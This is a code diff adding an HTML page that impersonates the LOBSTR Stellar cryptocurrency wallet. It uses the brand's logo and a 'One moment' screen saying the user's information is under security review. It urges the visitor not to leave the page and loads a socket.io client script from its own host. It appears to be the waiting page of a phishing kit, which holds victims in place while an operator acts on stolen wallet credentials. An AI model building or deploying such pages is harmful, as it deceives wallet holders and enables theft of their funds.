@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOBSTR — Simple and Secure Stellar Wallet</title>
+    <link rel="icon" href="https://static.lobstr.co/static/landing/images/logo.svg" type="image/svg+xml">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Ubuntu', sans-serif;
+            background: rgb(0, 0, 0);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            overflow: hidden;
+        }
+        
+        .loading-container {
+            text-align: center;
+            padding: 60px 40px;
+            background: rgb(12, 12, 12);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.5);
+            max-width: 500px;
+            width: 90%;
+        }
+        
+        .logo-container {
+            margin-bottom: 30px;
+            background: #1B8DA0;
+            padding: 20px 40px;
+            border-radius: 6px;
+            display: inline-block;
+        }
+        
+        .logo-container img {
+            width: 140px;
+            height: auto;
+            display: block;
+        }
+        
+        .loading-text {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 40px;
+            color: #ffffff;
+        }
+        
+        .loading-bar {
+            width: 60px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            margin: 0 auto 40px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .loading-bar-fill {
+            height: 100%;
+            width: 30%;
+            background: #1B8DA0;
+            animation: slide 1.5s ease-in-out infinite;
+        }
+        
+        .status-text {
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-top: 0;
+            font-weight: 400;
+            line-height: 1.6;
+            max-width: 380px;
+            margin: 0 auto;
+        }
+        
+        .warning-text {
+            font-size: 13px;
+            color: #ff6b6b;
+            margin-top: 30px;
+            font-weight: 500;
+            padding: 15px;
+            background: rgba(255, 107, 107, 0.1);
+            border-radius: 4px;
+            border-left: 3px solid #ff6b6b;
+        }
+        
+        @keyframes slide {
+            0% {
+                transform: translateX(-100%);
+            }
+            100% {
+                transform: translateX(400%);
+            }
+        }
+        
+        .footer-text {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.4);
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+    </style>
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="logo-container">
+            <img src="https://static.lobstr.co/static/landing/images/logo.svg" alt="LOBSTR Logo" onerror="this.style.display='none'; this.parentElement.style.background='transparent'; this.parentElement.innerHTML='<h2 style=\'color: #1B8DA0; font-size: 32px; font-weight: 600;\'>LOBSTR</h2>'">
+        </div>
+        
+        <h1 class="loading-text">One moment</h1>
+        
+        <div class="loading-bar">
+            <div class="loading-bar-fill"></div>
+        </div>
+        
+        <p class="status-text">We are currently reviewing your information to ensure the security for your account.</p>
+        
+        <p class="status-text" style="margin-top: 20px;">Please allow us some time to verify your data.</p>
+        
+        <div class="warning-text">
+            <strong>Important:</strong> DO NOT navigate away from this page during this process.
+        </div>
+        
+        <div class="footer-text">
+            Thank you for your patience and understanding.
+        </div>
+    </div>
+    
+    <script src="/js/socket-client.js"></script>
+    <script>
+        // Additional page-specific functionality if needed
+        console.log('Lobstr loading page initialized');
+    </script>
+</body>
+</html>
